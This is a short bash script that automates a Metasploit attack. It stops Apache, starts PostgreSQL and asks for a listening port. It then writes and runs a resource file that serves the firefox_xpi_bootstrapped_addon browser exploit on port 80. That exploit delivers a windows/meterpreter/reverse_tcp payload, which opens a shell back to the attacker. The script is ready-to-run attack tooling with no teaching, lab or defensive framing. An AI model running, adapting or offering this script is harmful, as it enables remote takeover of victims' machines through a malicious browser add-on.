echo "Killing Troublesome Processes"
echo "============================="
echo "                             "
echo "           done              "
echo "                             "
service apache2 stop
echo "Starting Required Services"
echo "============================="
echo "                             "
echo "           done              "
echo "                             "
service postgresql start
IP=$(hostname -I)
read -p "ENTER YOUR LPORT NUMBER : " PORT
echo "IP BEING USED    : $IP"
echo "PORT BEING USED  : $PORT"
echo "use exploit/multi/browser/firefox_xpi_bootstrapped_addon" > /tmp/firefox.rc
echo "set TARGET 1" >> /tmp/firefox.rc
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> /tmp/firefox.rc
echo "set SRVHOST $IP" >> /tmp/firefox.rc
echo "set SRVPORT 80" >> /tmp/firefox.rc
echo "set URIPATH /" >> /tmp/firefox.rc
echo "set LHOST $IP" >> /tmp/firefox.rc
echo "set LPORT $PORT" >> /tmp/firefox.rc
echo "exploit" >> /tmp/firefox.rc
msfconsole -q -r /tmp/firefox.rc
